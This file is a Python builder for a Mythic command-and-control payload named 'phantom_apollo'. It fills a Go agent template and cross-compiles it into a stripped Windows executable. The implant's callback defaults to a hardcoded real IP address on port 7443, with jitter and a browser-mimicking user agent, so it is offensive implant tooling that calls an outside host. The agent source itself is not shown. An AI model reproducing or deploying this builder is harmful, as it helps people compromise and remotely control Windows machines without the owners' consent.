import pathlib
from mythic_container import *
import os
import subprocess
import base64

class PhantomApollo(PayloadType):
    name = "phantom_apollo"
    file_extension = "exe"
    author = "@phantom"
    supported_os = [
        SupportedOS.Windows,
    ]
    wrapper = False
    wrapped_payloads = []
    note = "Phantom Apollo - Advanced C2 agent with Apollo compatibility and enhanced features"
    supports_dynamic_loading = True
    mythic_encrypts = False
    translation_container = None
    agent_type = "agent"
    agent_icon_path = pathlib.Path(".") / "phantom_apollo" / "agent_functions" / "mythic_agent_icon.svg"
    
    build_parameters = [
        BuildParameter(
            name="callback_host",
            parameter_type=BuildParameterType.String,
            description="Callback Host",
            default_value="37.27.249.191",
        ),
        BuildParameter(
            name="callback_port",
            parameter_type=BuildParameterType.Number,
            description="Callback Port",
            default_value="7443",
        ),
        BuildParameter(
            name="callback_interval",
            parameter_type=BuildParameterType.Number,
            description="Callback Interval in seconds",
            default_value="10",
        ),
        BuildParameter(
            name="callback_jitter",
            parameter_type=BuildParameterType.Number,
            description="Callback Jitter percentage (0-100)",
            default_value="10",
        ),
        BuildParameter(
            name="use_ssl",
            parameter_type=BuildParameterType.Boolean,
            description="Use SSL for callback",
            default_value=True,
        ),
        BuildParameter(
            name="user_agent",
            parameter_type=BuildParameterType.String,
            description="User Agent String",
            default_value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ),
        BuildParameter(
            name="aes_psk",
            parameter_type=BuildParameterType.String,
            description="Encryption Key",
            default_value="",
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.Boolean,
            description="Enable debug mode",
            default_value=False,
        ),
    ]
    
    c2_profiles = ["HTTP"]
    
    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        
        # Build parameters with your Mythic server
        callback_host = self.get_parameter("callback_host") or "37.27.249.191"
        callback_port = self.get_parameter("callback_port") or "7443"
        callback_interval = self.get_parameter("callback_interval") or "10"
        callback_jitter = self.get_parameter("callback_jitter") or "10"
        use_ssl = self.get_parameter("use_ssl") if self.get_parameter("use_ssl") is not None else True
        user_agent = self.get_parameter("user_agent") or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        aes_psk = self.get_parameter("aes_psk") or ""
        debug = self.get_parameter("debug") if self.get_parameter("debug") is not None else True
        
        # Construct callback URL for your Mythic server
        protocol = "https" if use_ssl else "http"
        callback_url = f"{protocol}://{callback_host}:{callback_port}"
        
        # Read the Go agent template
        with open("agent_code/phantom_agent.go", "r") as f:
            go_template = f.read()
        
        # Replace template variables with build parameters
        go_source = go_template.replace("{{.callback_host}}", callback_host)
        go_source = go_source.replace("{{.callback_port}}", str(callback_port))
        go_source = go_source.replace("{{.callback_interval}}", str(callback_interval))
        go_source = go_source.replace("{{.callback_jitter}}", str(callback_jitter))
        go_source = go_source.replace("{{.use_ssl}}", "true" if use_ssl else "false")
        go_source = go_source.replace("{{.user_agent}}", user_agent)
        go_source = go_source.replace("{{.aes_psk}}", aes_psk)
        go_source = go_source.replace("{{.debug}}", "true" if debug else "false")
        
        # Write the customized source code
        with open("phantom_agent_build.go", "w") as f:
            f.write(go_source)
        
        try:
            # Determine target architecture
            target_arch = "amd64"  # Default to 64-bit
            if "x32" in self.uuid or "386" in self.uuid:
                target_arch = "386"
            
            # Build the Go executable
            build_cmd = [
                "go", "build",
                "-ldflags", "-s -w",
                "-o", f"phantom_apollo_{target_arch}.exe",
                "phantom_agent_build.go"
            ]
            
            # Set environment variables for cross-compilation
            env = os.environ.copy()
            env["GOOS"] = "windows"
            env["GOARCH"] = target_arch
            env["CGO_ENABLED"] = "0"
            
            # Execute build command
            result = subprocess.run(build_cmd, env=env, capture_output=True, text=True)
            
            if result.returncode != 0:
                resp.build_stderr = f"Build failed: {result.stderr}"
                resp.status = BuildStatus.Error
                return resp
            
            # Read the compiled executable
            exe_path = f"phantom_apollo_{target_arch}.exe"
            with open(exe_path, "rb") as f:
                resp.payload = base64.b64encode(f.read()).decode()
            
            resp.build_message = f"Successfully built Phantom Apollo for Windows {target_arch}"
            
            # Clean up temporary files
            os.remove("phantom_agent_build.go")
            os.remove(exe_path)
            
        except Exception as e:
            resp.build_stderr = f"Build error: {str(e)}"
            resp.status = BuildStatus.Error
        
        return resp